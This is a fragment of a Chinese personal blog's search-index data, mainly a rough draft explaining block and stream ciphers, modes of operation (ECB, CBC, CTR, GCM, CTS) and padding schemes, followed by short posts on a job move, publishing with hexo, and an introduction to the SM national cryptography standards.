alt=\"GCM\"></p>\n<h3 id=\"分组密码算法（Block-Cipher）\"><a href=\"#分组密码算法（Block-Cipher）\" class=\"headerlink\" title=\"分组密码算法（Block Cipher）\"></a>分组密码算法（Block Cipher）</h3><p>也称为块密码算法。这种算法一次只能加密固定大小的块（例如 128 位），适用于磁盘文件的数据加密。<br><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/block-cipher.png\" alt=\"bolck cipher\"><br>分组加密算法可以设计非常复杂的逻辑处理，加密强度较高，但也需要消耗较多硬件资源。<br>绝大多数对称加密算法都是分组加密算法，，但常见算法包括：</p>\n<ul>\n<li>数据加密标准（DES）</li>\n<li>三重 DES（3DES 或 TDEA）</li>\n<li>高级加密标准（AES）</li>\n<li>国际数据加密算法（IDEA）</li>\n<li>河豚，</li>\n<li>Twofish</li>\n<li>RC5</li>\n</ul>\n<h3 id=\"流密码算法（Stream-Cipher）\"><a href=\"#流密码算法（Stream-Cipher）\" class=\"headerlink\" title=\"流密码算法（Stream Cipher）\"></a>流密码算法（Stream Cipher）</h3><p>可对数据进行逐位加密和解密，将明文数据逐字节地加密为密文流，而不必等待指定长度的数据块形成，这与流媒体服务非常相似，经常用于某些数据在途加密，包括 SSL &#x2F; TLS 密码套件、蓝牙连接、蜂窝和 4G 连接等重要业务场景。流密码实际上是如何在技术上起作用的呢？</p>\n<ul>\n<li>基于加密密钥（Key）和种子（Nonce，随机数），通过特定算法（Stream Cipher）生成一个伪随机比特流（Keystream）</li>\n<li>该伪随机比特流作为密钥流，与明文输入的一个字节进行异或运算，生成单个字节的密文输出</li>\n<li>这种重复过程会在每一位明文数据中反复发生，最终生成持续不断的密文输出</li>\n</ul>\n<p><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/stream-cipher.png\" alt=\"Stream Cipher\"></p>\n<p>请注意，实际上流密码有同步 &#x2F; 异步 的两种工作模式，即：</p>\n<ul>\n<li>同步流密码（也称密钥自动密钥，即 KAK），这些类型的密码独立于任何先前的纯文本或密文生成密钥流。</li>\n<li>异步流密码（也称自同步流密码，密文自动密钥或 CTAK）。这些密码依赖于先前的密文位来生成密钥流。</li>\n</ul>\n<p>一般来说，流算法比分组密码更快更高效，因为它们一次只将一位数据加密为单个符号，而不是整个块。因此，它们更适合于资源较少的设备。同时，由于这种单比特数据方法，这意味着如果一个符号中有错误，则影响下一个符号的可能性较小。常见算法包括：</p>\n<ul>\n<li>Salsa20：软件和硬件均可实现</li>\n<li>ChaCha20：是 Salsa20 的修改版；TLS 1.3支持 ChaCha20</li>\n<li>RC4（<strong>已弃用</strong>）：由美国密码学家罗纳德·李维斯特（Ronald Rivest）在1987年设计的，常用于无线网络。由于RC4算法存在弱点，2015年2月所发布的 RFC 7465 规定禁止在TLS中使用RC4加密算法。</li>\n<li>A5：用于 GSM 蜂窝网络的核心算法</li>\n</ul>\n<p>但是，某些流密码容易受到<strong>比特翻转攻击</strong>和<strong>密钥重用攻击</strong>的攻击，为此需要注意不要再次使用相同的精确键-Nonce 组合。</p>\n<blockquote>\n<p>由于异或运算（XOR）的<strong>对合性</strong>，加密和解密的计算过程可以完全相同，因此在加密算法中得到广泛应用。</p>\n</blockquote>\n<h2 id=\"二、基础工作模式\"><a href=\"#二、基础工作模式\" class=\"headerlink\" title=\"二、基础工作模式\"></a>二、基础工作模式</h2><p>密码学中，分组密码的工作模式（mode of operation）允许使用同一个分组密码密钥对多于一块的数据进行加密，并保证其安全性。分组密码自身只能加密长度等于密码分组长度的单块数据，若要加密变长数据，则数据必须先被划分为一些单独的密码块。通常而言，最后一块数据也需要使用合适填充方式将数据扩展到符合密码块大小的长度。一种工作模式描述了加密每一数据块的过程，并常常使用基于一个通常称为初始化向量的附加输入值以进行随机化，以保证安全。</p>\n<h3 id=\"历史和标准化\"><a href=\"#历史和标准化\" class=\"headerlink\" title=\"历史和标准化\"></a>历史和标准化</h3><p>最早出现的工作模式，ECB，CBC，OFB和CFB可以追溯到1981年[4]。2001年，NIST修订了其早先发布的工作模式任务栏表，加入了AES，并加入了CTR模式[5]。最后，在2010年1月，NIST加入了XTS-AES[6]，而其余的可信模式并没有为NIST所认证。例如CTS是一种密文窃取的模式，许多常见的密码学运行库提供了这种模式。</p>\n<p>ECB，CBC，OFB，CFB，CTR和XTS模式仅仅提供了机密性；为了保证加密信息没有被意外修改或恶意篡改，需要采用分离的消息验证码，例如CBC-MAC。密码学社群认识到了对专用的保证完整性的方法的需求，NIST因此提出了HMAC，CMAC和GMAC。HMAC在2002年通过了认证[7]，CMAC在2005年通过[8]，GMAC则在2007年被标准化[9]。</p>\n<p>在发现将认证模式与加密模式联合起来的难度之后，密码学社区开始研究结合了加密和认证的单一模式，这种模式被称为认证加密模式（AE，Authenticated Encryption），或称为authenc。AE模式的例子包括CCM[10]，GCM[11]，CWC，EAX，IAPM和OCB。</p>\n<p>现在，工作模式为许多国家和国内的标准认证实体所定义，其中最有影响力的来源是美国的NIST，而其它有影响力的组织包括ISO，IEC，IEEE，美国的ANSI，以及IETF。</p>\n<h3 id=\"初始化向量（IV）\"><a href=\"#初始化向量（IV）\" class=\"headerlink\" title=\"初始化向量（IV）\"></a>初始化向量（IV）</h3><p>初始化向量（IV，Initialization Vector）是许多任务作模式中用于将加密随机化的一个位块，由此即使同样的明文被多次加密也会产生不同的密文，避免了较慢的重新产生密钥的过程。</p>\n<p>初始化向量与密钥相比有不同的安全性需求，因此IV通常无须保密，然而在大多数情况中，不应当在使用同一密钥的情况下两次使用同一个IV。对于CBC和CFB，重用IV会导致泄露明文首个块的某些信息，亦包括两个不同消息中相同的前缀。对于OFB和CTR而言，重用IV会导致完全失去安全性。另外，在CBC模式中，IV在加密时必须是无法预测的；特别的，在许多实现中使用的产生IV的方法，例如SSL2.0使用的，即采用上一个消息的最后一块密文作为下一个消息的IV，是不安全的。</p>\n<h2 id=\"二、基础工作模式-1\"><a href=\"#二、基础工作模式-1\" class=\"headerlink\" title=\"二、基础工作模式\"></a>二、基础工作模式</h2><p>AES五种加密模式（CBC、ECB、CTR、OCF、CFB）.</p>\n<h3 id=\"1-ECB（Electronic-Codebook-Book，电码本模式\"><a href=\"#1-ECB（Electronic-Codebook-Book，电码本模式\" class=\"headerlink\" title=\"1. ECB（Electronic Codebook Book，电码本模式)\"></a>1. ECB（Electronic Codebook Book，电码本模式)</h3><h3 id=\"2-CTR-Counter，分组模式）\"><a href=\"#2-CTR-Counter，分组模式）\" class=\"headerlink\" title=\"2. CTR (Counter，分组模式）\"></a>2. CTR (Counter，分组模式）</h3><p>同样将明文&#x2F;密文拆分成若干个长度固定的分组，但是其算法包含了3个参数：</p>\n<ul>\n<li>初始向量 IV（Initialization Vector）：也被称作 Salt 或者 Nonce。通常是一个随机数，主要作用是往密文中添加随机性，使同样的明文被多次加密也会产生不同的密文，从而确保密文的不可预测性</li>\n<li>计数器 Counter: 自增的算子。一般从 0 开始，每次计算都自增 1，相当于一次一密</li>\n<li>密钥 Key: 对称加密的密钥</li>\n</ul>\n<p>CTR模式简单快速，安全可靠，而且可以并行加密，但是在计算器不能维持很长的情况下，密钥只能使用一次。</p>\n<h3 id=\"3-CBC（Cipher-Block-Chaining，密码分组链接模式）\"><a href=\"#3-CBC（Cipher-Block-Chaining，密码分组链接模式）\" class=\"headerlink\" title=\"3. CBC（Cipher Block Chaining，密码分组链接模式）\"></a>3. CBC（Cipher Block Chaining，密码分组链接模式）</h3><h3 id=\"5-CFB（Cipher-FeedBack，密码反馈模式）\"><a href=\"#5-CFB（Cipher-FeedBack，密码反馈模式）\" class=\"headerlink\" title=\"5. CFB（Cipher FeedBack，密码反馈模式）\"></a>5. CFB（Cipher FeedBack，密码反馈模式）</h3><p>类似于CBC，可以将块密码变为自同步的流密码；工作过程亦非常相似，CFB的解密过程几乎就是颠倒的CBC的加密过程：</p>\n<h3 id=\"6-OFB（Output-FeedBack，输出反馈模式）\"><a href=\"#6-OFB（Output-FeedBack，输出反馈模式）\" class=\"headerlink\" title=\"6. OFB（Output FeedBack，输出反馈模式）\"></a>6. OFB（Output FeedBack，输出反馈模式）</h3><p>这种模式较复杂。</p>\n<p>常用的安全块模式是 CBC（密码块链接）、CTR（计数器）和 GCM（伽罗瓦&#x2F;计数器模式），它们需要一个随机（不可预测的）初始化向量 (IV)，也称为 nonce 或 salt<br>「CTR（Counter）」块模式在大多数情况下是一个不错的选择，因为它具有很强的安全性和并行处理能力，允许任意输入数据长度（无填充）。但它不提供身份验证和完整性，只提供加密</p>\n<p>GCM（Galois&#x2F;Counter Mode）块模式继承了 CTR 模式的所有优点，并增加了加密消息认证能力。GCM 是在对称密码中实现认证加密的快速有效的方法，强烈推荐</p>\n<p>CBC 模式在固定大小的分组上工作。因此，在将输入数据拆分为分组后，应使用填充算法使最后一个分组的长度一致。大多数应用程序使用 PKCS7 填充方案或 ANSI X.923. 在某些情况下，CBC 阻塞模式可能容易受到「padding oracle」攻击，因此最好避免使用 CBC 模式<br>众所周知的不安全块模式是 ECB（电子密码本），它将相等的输入块加密为相等的输出块（无加密扩散能力）。<br>CBC、CTR 和 GCM 模式等大多数块都支持「随机访问」解密。比如在视频播放器中的任意时间偏移处寻找，播放加密的视频流<br>总之，建议使用 CTR (Counter) 或 GCM (Galois&#x2F;Counter) 分组模式。 其他的分组在某些情况下可能会有所帮助，但很可能有安全隐患，因此除非你很清楚自己在做什么，否则不要使用其他分组模式！</p>\n<p>CTR 和 GCM 加密模式有很多优点：它们是安全的（目前没有已知的重大缺陷），可以加密任意长度的数据而无需填充，可以并行加密和解密分组（在多核 CPU 中）并可以直接解密任意一个密文分组。 因此它们适用于加密加密钱包、文档和流视频（用户可以按时间查找）。 GCM 还提供消息认证，是一般情况下密码块模式的推荐选择。</p>\n<p>请注意，GCM、CTR 和其他分组模式会泄漏原始消息的长度，因为它们生成的密文长度与明文消息的长度相同。 如果您想避免泄露原始明文长度，可以在加密前向明文添加一些随机字节（额外的填充数据），并在解密后将其删除。</p>\n<p>分组密码有五种工作体制：1.电码本模式（Electronic Codebook Book (ECB)）；2.密码分组链接模式（Cipher Block Chaining (CBC)）；3.计算器模式（Counter (CTR)）；4.密码反馈模式（Cipher FeedBack (CFB)）；5.输出反馈模式（Output FeedBack (OFB)）。<br>以下逐一介绍一下：<br>1.电码本模式（Electronic Codebook Book (ECB)<br>    这种模式是将整个明文分成若干段相同的小段，然后对每一小段进行加密。</p>\n<p>AES 是对称加密算法的一种，了解AES 算法可以从这几方面入手：</p>\n<p>密钥支持的长度<br>常用的工作模式（ECB模式&#x2F;CBC模式）<br>Padding 的填充模式<br>密钥<br>密钥是AES算法实现加解密的根本。对称加密算法之所以对称，是因为这类算法对明文的加密和解密需要使用相同的一个。<br>AES 支持三种长度的密钥:</p>\n<p>128bit (16B), 192bit(24B) , 256bit(32B)</p>\n<p>使用效果:</p>\n<p>AES256 安全性最高，AES128性能最优。本质是它们的加密处理轮数不同。</p>\n<p>AES128\t10轮<br>AES192\t12轮<br>AES256\t14轮<br>ECB 模式<br>ECB 模式是最简单块密码加密模式，加密前根据加密块大小（AES 128位）分成若干块，之后将每块使用相同的密钥单独加密，在该模式下，每个明文块的加密都是独立的，互不影响的。解密同理。</p>\n<p>优势</p>\n<p>简单</p>\n<p>有利于并行计算</p>\n<p>缺点</p>\n<p>相同的明文块经过加密会变成相同的密文块，因此安全性较差。<br>CBC 模式<br>CBC模式引入一个新的概念：初始向量IV。</p>\n<p>IV的作用和MD5的”加盐”有些类似，目的是防止同样的明文块始终加密成相同的密文块。</p>\n<p>CBC模式原理:</p>\n<p>在每个明文块加密前会让那个明文块和IV向量先做异或操作。IV作为初始化变量，参与第一个明文块的异或，</p>\n<p>后续的每个明文块和它前一个明文块所加密出的密文块相异或，这样相同的明文块加密出来的密文块显然不一样。</p>\n<p>优势</p>\n<p>安全性更高<br>缺点</p>\n<p>无法并行计算，性能上不如ECB</p>\n<p>引入初始向量IV，增加复杂度</p>\n<h4 id=\"CTS\"><a href=\"#CTS\" class=\"headerlink\" title=\"CTS\"></a>CTS</h4><p>在密码学中，密文窃取（CTS）是使用分组密码操作模式的通用方法，该操作模式允许处理不能均匀分割成块的消息，而不会延长密文，代价是略为复杂。</p>\n<p>目录<br>一般特性<br>编辑<br>窃取密文是使用密码加密明文的技术，不须将消息填充到块大小的倍数，因此密文与明文大小相同。</p>\n<p>它通过更改消息最后两块来实现这点。除了最后两块之外，所有块都保持不变，但“窃取”倒数第二块的一部分密文用以填充最后一块明文块。填充的最后一块，然后像往常一样加密。</p>\n<p>最终密文的最后两块，包括部分倒数第二块（删掉“窃取”部分）和完整的最后一块，它们大小与原明文相同。</p>\n<p>解密时要求首先解密最后一块，然后将“窃取”的密文恢复到倒数第二块，然后可以像往常一样解密。</p>\n<p>原则上，任何使用块密码的分组加密模式都可用，但流密码模式已经可以加密任意长度的消息无需填充，因此它们不能用该操作。与窃取密文相结合的常用加密方式有电子密码本（ECB）和密码块链接（CBC）。</p>\n<p>ECB密文窃取要明文长过一块。当明文长度为一个或更少时，一种可能的解决办法是，使用一种类似流密码的分组密码操作模式，如CTR、CFB或OFB。</p>\n<p>CBC密文窃取不一定要明文长过一块。在明文为一块或更少块长度的情况下，初始向量（IV）可作为先前的密文块。在这种情况，必须将修改后的IV发送予接受者。但这在发送密文时IV不能由发送者自由选择的情况下（如当IV是派生值或预先确定的值）不太可能，并且在这种情况下，针对CBC模式的密文窃取只能在明长于一个块文中发生。</p>\n<p>为了以CTS加密或解密未知长度的数据，必须延迟处理（和缓存）最新的两块数据块，以便处理数据流末端。</p>\n<h2 id=\"三、认证加密模式（AE，Authenticated-Encryption）\"><a href=\"#三、认证加密模式（AE，Authenticated-Encryption）\" class=\"headerlink\" title=\"三、认证加密模式（AE，Authenticated Encryption）\"></a>三、认证加密模式（AE，Authenticated Encryption）</h2><h3 id=\"1-GCM-Galois-Counter-Mode，分组模式）\"><a href=\"#1-GCM-Galois-Counter-Mode，分组模式）\" class=\"headerlink\" title=\"1. GCM (Galois Counter Mode，分组模式）\"></a>1. GCM (Galois Counter Mode，分组模式）</h3><p>GCM (Galois&#x2F;Counter) 模式在 CTR 模式的基础上，添加了消息认证的功能，而且同时还具有与 CTR 模式相同的并行计算能力。因此相比 CTR 模式，GCM 不仅速度一样快，还能额外提供对消息完整性、真实性的验证能力。</p>\n<p>在密码学中，伽罗瓦&#x2F;计数器模式( GCM ) 是对称密钥加密分组密码的一种操作模式，因其性能而被广泛采用。可以使用廉价的硬件资源实现最先进的高速通信通道的 GCM 吞吐率。 [1]该操作是一种经过身份验证的加密算法，旨在提供数据真实性（完整性）和保密性。 GCM 是为块大小为 128 位的块密码定义的。 伽罗瓦消息认证码（Galois Message Authentication Code ，GMAC ) 是 GCM 的仅认证变体，可以形成增量消息认证代码。 GCM 和 GMAC 都可以接受任意长度的初始化向量。</p>\n<p>不同的分组密码操作模式可能具有明显不同的性能和效率特性，即使使用相同的分组密码也是如此。 GCM 可以充分利用并行处理，实现 GCM 可以有效利用指令流水线或硬件流水线。相比之下，密码块链接（CBC）操作模式会导致流水线停顿，从而影响其效率和性能。</p>\n<p>与普通计数器模式一样，块按顺序编号，然后该块编号与初始化向量（Initialization Vector，IV） 组合并使用块密码E加密，通常为AES 。然后将此加密的结果与明文进行异或以产生密文。与所有计数器模式一样，这本质上是一个流密码，因此对于每个加密的流使用不同的 IV 是必不可少的。</p>\n<p>密文块被视为多项式的系数，然后在依赖于密钥的点H使用有限域算术对其进行评估。然后对结果进行加密，生成可用于验证数据完整性的身份验证标签。然后，加密文本包含 IV、密文和身份验证标签。</p>\n<hr>\n<p>认证加密<br>主条目：认证加密<br>一些工作模式在设计中希望将保密性和认证性结合起来，例如XCBC[21]，ACBC，APM[22]，OCB，EAX，CWC，CCM和GCM。认证加密模式被可以分为单次处理和两次处理两种类型。然而，对密码学用户社群而言，不幸的是，许多单次处理的认证加密算法，例如OCB，是受专利所保护的。</p>\n<p>另外，有的模式也允许为未加密的关联数据进行认证，因此被称为AEAD（Authenticated-Encryption with Associated-Data，用于关联数据的认证加密）。例如，EAX是一种两次处理的AEAD方法，而OCB模式是单次的。</p>\n<hr>\n<p>流密码的特点：<br>按位处理理明⽂文消息(as a stream)<br>• 典型做法是⽤用⼀一个伪随机流 密钥与明⽂文按位异或<br>• 流密钥的随机性完全扰乱了了 明⽂文消息的统计特性<br>• 不不能重复使⽤用流密钥，不不然 系统可能被破解</p>\n<hr>\n<h2 id=\"附录一：如何解决分组密码的碎片问题\"><a href=\"#附录一：如何解决分组密码的碎片问题\" class=\"headerlink\" title=\"附录一：如何解决分组密码的碎片问题\"></a>附录一：如何解决分组密码的碎片问题</h2><p>在分组密码中，当数据长度不等于分组长度的倍数时，需要有效处理碎片问题，有填充和密文窃取两种方法。</p>\n<h3 id=\"1-填充-padding\"><a href=\"#1-填充-padding\" class=\"headerlink\" title=\"1. 填充 - padding\"></a>1. 填充 - padding</h3><p>在分组密码中，当数据长度不等于分组长度的倍数时，需要按一定的方式，将尾部明文分组进行填充，这种将尾部分组数据填满的方法称为<strong>填充</strong>（Padding)。常见的处理规则有：</p>\n<h4 id=\"ANSI-X9-23\"><a href=\"#ANSI-X9-23\" class=\"headerlink\" title=\"ANSI X9.23\"></a>ANSI X9.23</h4><p>在填充字节序列中，最后一个字节填充为需要填充的字节长度(示例为0x04)，其余字节填充0。<br><code>... | DD DD DD DD DD DD DD DD | DD DD DD DD 00 00 00 04 |</code></p>\n<h4 id=\"ISO-10126\"><a href=\"#ISO-10126\" class=\"headerlink\" title=\"ISO 10126\"></a>ISO 10126</h4><p>在填充字节序列中，最后一个字节填充为需要填充的字节长度(示例为0x04)，其余字节填充<strong>随机数</strong>。<br><code>... | DD DD DD DD DD DD DD DD | DD DD DD DD 81 A6 23 04 |</code></p>\n<h4 id=\"PKCS-7\"><a href=\"#PKCS-7\" class=\"headerlink\" title=\"PKCS#7\"></a>PKCS#7</h4><p>PKCS#7 定义于 RFC 5652。<br>在填充字节序列中，每个字节填充为需要填充的字节长度(示例为0x04)。<br><code>... | DD DD DD DD DD DD DD DD | DD DD DD DD 04 04 04 04 |</code></p>\n<h4 id=\"ISO-IEC-7816-4\"><a href=\"#ISO-IEC-7816-4\" class=\"headerlink\" title=\"ISO&#x2F;IEC 7816-4\"></a>ISO&#x2F;IEC 7816-4</h4><p>在填充字节序列中，第一个字节填充固定值<strong>0x80</strong>，其余字节填充0。若只需填充一个字节，则直接填充<strong>0x80</strong>。<br><code>... | DD DD DD DD DD DD DD DD | DD DD DD DD 80 00 00 00 |</code><br><code>... | DD DD DD DD DD DD DD DD | DD DD DD DD DD DD DD 80 |</code></p>\n<blockquote>\n<p>采用填充方式时，密文长度通常大于明文长度，意味着网络传输时需要消耗额外的传输能力。</p>\n</blockquote>\n<h3 id=\"2-密文窃取-Ciphertext-stealing\"><a href=\"#2-密文窃取-Ciphertext-stealing\" class=\"headerlink\" title=\"2. 密文窃取 - Ciphertext stealing\"></a>2. 密文窃取 - Ciphertext stealing</h3><p>窃取密文是使用密码加密明文的技术，不须将消息填充到块大小的倍数，因此密文与明文大小相同。<br>它通过更改消息最后两块来实现这点。除了最后两块之外，所有块都保持不变，但“窃取”倒数第二块的一部分密文用以填充最后一块明文块。填充的最后一块，然后像往常一样加密。<br>最终密文的最后两块，包括部分倒数第二块（删掉“窃取”部分）和完整的最后一块，它们大小与原明文相同。<br>解密时要求首先解密最后一块，然后将“窃取”的密文恢复到倒数第二块，然后可以像往常一样解密。<br>原则上，任何使用块密码的分组加密模式都可用，但流密码模式已经可以加密任意长度的消息无需填充，因此它们不能用该操作。与窃取密文相结合的常用加密方式有电子密码本（ECB）和密码块链接（CBC）。</p>\n<p>ECB密文窃取要明文长过一块。当明文长度为一个或更少时，一种可能的解决办法是，使用一种类似流密码的分组密码操作模式，如CTR、CFB或OFB。<br>CBC密文窃取不一定要明文长过一块。在明文为一块或更少块长度的情况下，初始向量（IV）可作为先前的密文块。在这种情况，必须将修改后的IV发送予接受者。但这在发送密文时IV不能由发送者自由选择的情况下（如当IV是派生值或预先确定的值）不太可能，并且在这种情况下，针对CBC模式的密文窃取只能在明长于一个块文中发生。<br>为了以CTS加密或解密未知长度的数据，必须延迟处理（和缓存）最新的两块数据块，以便处理数据流末端。<br><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/CTS_ECB.png\" alt=\"CTS-ECB\"></p>\n<p>密文格式<br>有几种不同的方式来排列密文以便传输。不同排列方式的密文位元数都相同，只是传输顺序不同，因此选择不影响安全性，纯粹是为了方便实现。<br>也就是分组密码如何转换为流密码的问题，也是关于填充处理的问题</p>\n<blockquote>\n<p>采用密文窃取方式时，密文长度严格等于明文长度，不会浪费网络传输能力，同时这个优点非常适合磁盘文件存储（文件大小等于密文长度），因此产生 AES-XTS 工作模式。<br>密文窃取也是有代价的，需要延迟处理（和缓存）最新的两块数据块，以便处理数据流末端。</p>\n</blockquote>\n<hr>\n<p>可以看到加密时 s 位的明文分组加密成 s 位的密文分组 ，而位数 s 不取决于加密函数，因此可以通过选择 s 的大小（通常为 8 位）来使得明文长度等于密文长度，从而不浪费传输能力。相比于 CFB 模式，那些需要填充的分组密码工作模式，往往是密文长度稍大于实际的明文长度，这样会使得传输能力被浪费。</p>\n<p>可以看到在分组加密工作模式中仍然可以实现加密单个字节的明文分组，此时分组密码可以转换为流密码，流密码最大的特点就是明文和密文等长，分组密码则不是如此，但在一些工作模式中分组密码实际上达到了流密码的特点。</p>\n<blockquote>\n<p>碎片填充造成密文长度大于明文，意味着需要消耗额外的传输能力。</p>\n</blockquote>\n<hr>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ul>\n<li><a href=\"https://thiscute.world/posts/practical-cryptography-basics-1/\">系列 - 写给开发人员的实用密码学</a></li>\n<li><a href=\"http://stuyang.com/blog/6fdd6732f56d/\">分组加密工作模式 - Yang‘s blog</a></li>\n<li><a href=\"https://www.asiaregister.com/zh/news/fen-zu-mi-ma-yu-liu-mi-ma-ta-men-shi-shen-me-yi-ji-ta-men-ru-he-gong-zuo-2453.htm\">分组密码与流密码：它们是什么以及它们如何工作</a></li>\n<li><a href=\"https://zh.m.wikipedia.org/zh-hans/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F\">分组密码工作模式 - WiKi</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/20279484\">OS X Disk Util Manual Basic</a></li>\n<li><a href=\"https://github.com/libyal/libfvde/blob/main/documentation/FileVault%20Drive%20Encryption%20(FVDE).asciidoc\">FileVault Drive Encryption (FVDE)</a></li>\n<li><a href=\"https://www.ibm.com/docs/en/linux-on-systems?topic=examples-aes-xts-mode-example\">AES with XTS mode example - IBM</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"nistspecialpublication800-38a.pdf\">分组密码 工作模式建议：NIST SP 800-38A 2001 Edition</a></li>\n<li><a href=\"nistspecialpublication800-38d.pdf\">分组密码 GCM&#x2F;GMAC 工作模式：NIST SP 800-38D 2001 Edition</a></li>\n<li><a href=\"nistspecialpublication800-38e.pdf\">分组密码 XTS-AESC 工作模式：NIST SP 800-38E 2001 Edition</a></li>\n<li><a href=\"1619-2007-NIST-Submission.pdf\">IEEE Std 1619-2007, The XTS-AES Tweakable Block Cipher</a></li>\n<li><a href=\"%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AE%9E%E8%B7%B5-%E8%8B%97%E4%BB%98%E5%8F%8B.pdf\">现代密码学理论与实践 - 苗付友.pdf</a></li>\n</ul>\n"},{"title":"又搬家了","url":"/2019/05/28/%E5%8F%88%E6%90%AC%E5%AE%B6%E4%BA%86/","content":"<p>昨天开始在北二环上班了。优点很多就不说了，至于缺点嘛……</p>\n<p>一是开车上班要90分钟，地铁也差不多，通勤很痛苦！</p>\n<p>二是物业餐饮真的不咋样，中饭25块钱，还吃不饱！</p>\n<p>慢慢适应吧:)</p>\n","tags":["生活"]},{"title":"发布blog的操作步骤","url":"/2018/12/23/%E5%8F%91%E5%B8%83blog%E7%9A%84%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4/","content":"<ol>\n<li>开启新blog</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&#x27;圣诞节怎么过？`</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><p>在 <code>/source/_posts</code>目录下发现一个新文件<code>圣诞节怎么过？.md</code>，自由编辑该文件</p>\n<blockquote>\n<p>在md文件的注释部分，可以标记category和tag，具体方法为：</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># hello-world.md</span><br><span class=\"line\">categories: 编程</span><br><span class=\"line\">tags: </span><br><span class=\"line\">    - hexo</span><br><span class=\"line\">    - github</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>文章写完了，看看效果如何，并点击<a href=\"http://localhost:4000/\">本地浏览器地址</a>看看效果如何</p>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo s</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>文章写的很精彩！现在，发布到<a href=\"https://nokiam9.github.io/\">blog主页</a></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo d -g</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>文章在Github上存个备份<blockquote>\n<p>如果使用vscode等IDE，可以直接点击git commit和git push的快捷方式</p>\n</blockquote>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ git add .</span><br><span class=\"line\">$ git commit -m <span class=\"string\">&#x27;Updated&#x27;</span></span><br><span class=\"line\">$ git push origin hexo</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>Game Over！大吉大利，今晚吃鸡！！！</li>\n</ol>\n","categories":["编程"],"tags":["hexo","github"]},{"title":"国密标准的简介","url":"/2019/08/29/%E5%9B%BD%E5%AF%86%E6%A0%87%E5%87%86%E7%9A%84%E7%AE%80%E4%BB%8B/","content":"<h2 id=\"国密算法的概述\"><a href=\"#国密算法的概述\" class=\"headerlink\" title=\"国密算法的概述\"></a>国密算法的概述</h2><p>国密即国家密码局认定的国产密码算法。主要有SM1，SM2，SM3，SM4。密钥长度和分组长度均为128位。</p>\n<p>2011年，国家密码管理局发布了《关于做好公钥密码算法升级工作的通知》，要求“自2011年3月1日起，在建和拟建公钥密码基础设施电子认证系统和密钥管理系统应使用国密算法。自2011年7月1日起，投入运行并使用公钥密码的信息系统，应使用SM2算法。”</p>\n<h2 id=\"国密SM1\"><a href=\"#国密SM1\" class=\"headerlink\" title=\"国密SM1\"></a>国密SM1</h2><p>SM1为对称加密。其加密强度与AES相当。该算法不公开，调用该算法时，需要通过加密芯片的接口进行调用。</p>\n<h2 id=\"国密SM2\"><a href=\"#国密SM2\" class=\"headerlink\" title=\"国密SM2\"></a>国密SM2</h2><p>SM2为基于ECC的非对称加密。该算法已公开。由于该算法基于ECC-256位，与RSA-2048相比，签名速度与秘钥生成速度更快，且安全强度更高。</p>\n<p>SM2椭圆曲线公钥密码算法是我国自主设计的公钥密码算法，包括SM2-1椭圆曲线数字签名算法，SM2-2椭圆曲线密钥交换协议，SM2-3椭圆曲线公钥加密算法，分别用于实现数字签名密钥协商和数据加密等功能。SM2算法与RSA算法不同的是，SM2算法是基于椭圆曲线上点群离散对数难题，相对于RSA算法，256位的SM2密码强度已经比2048位的RSA密码强度要高。</p>\n<h2 id=\"国密SM3\"><a href=\"#国密SM3\" class=\"headerlink\" title=\"国密SM3\"></a>国密SM3</h2><p>SM3是消息摘要。可以用MD5作为对比理解。该算法已公开。校验结果为256位。</p>\n<p>SM3密码杂凑算法是中国国家密码管理局于2010年公布的中国商用密码杂凑算法标准（其实也是哈希算法，或者单向散列算法），适用于商用密码应用中的数字签名和验证消息认证码的生成与验证以及随机数的生成，可满足多种密码应用的安全需求。</p>\n<p>该算法由王小云等人设计，消息分组为512位，经过填充和迭代压缩，生成256位的杂凑值。</p>\n<p>SM3算法的压缩函数与SHA-256的压缩函数具有相似结构，但其中关键的迭代压缩方法更有优势。</p>\n<p>为了保证杂凑算法的安全性，其产生的杂凑值的长度不应太短。MD5输出128比特杂凑值，SHA-1算法的输出长度为160比特，SM3算法的输出长度为256比特，因此SM3算法的安全性要高于MD5算法和SHA-1算法。</p>\n<h2 id=\"国密SM4\"><a href=\"#国密SM4\" class=\"headerlink\" 